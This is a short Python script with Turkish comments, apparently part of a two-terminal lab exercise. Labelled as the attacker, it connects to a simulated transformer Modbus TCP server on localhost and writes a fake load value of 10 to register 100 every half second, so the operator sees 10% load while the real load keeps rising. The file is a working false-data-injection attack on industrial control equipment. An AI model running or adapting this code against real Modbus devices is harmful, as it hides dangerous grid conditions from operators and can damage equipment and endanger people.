import time
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('localhost', port=502)
if not client.connect():
    print("[HATA] Trafo Sunucusuna (localhost:502) bağlanılamadı.")
    print("Lütfen Terminal 1'de 'transformer_sunucusu.py' script'ini çalıştırdığınızdan emin olun.")
    exit()

print("[SALDIRGAN] Trafo Sunucusuna (localhost:502) bağlandı.")

sahte_veri = 10 # Operatörün %10 yük görmesini istiyoruz

try:
    while True:
        # GÜVENSİZ Register 100'e (hedef) sahte veriyi (10) YAZ (inject)
        client.write_register(100, sahte_veri)
        
        print(f"[SALDIRGAN] Register 100'e 'SAHTE VERİ ({sahte_veri})' enjekte edildi. (Gerçek yük artmaya devam ediyor)")
        
        time.sleep(0.5) # Saldırıyı hızlı yap
except KeyboardInterrupt:
    client.close()
    print("\n[SALDIRGAN] Saldırı durduruldu.")
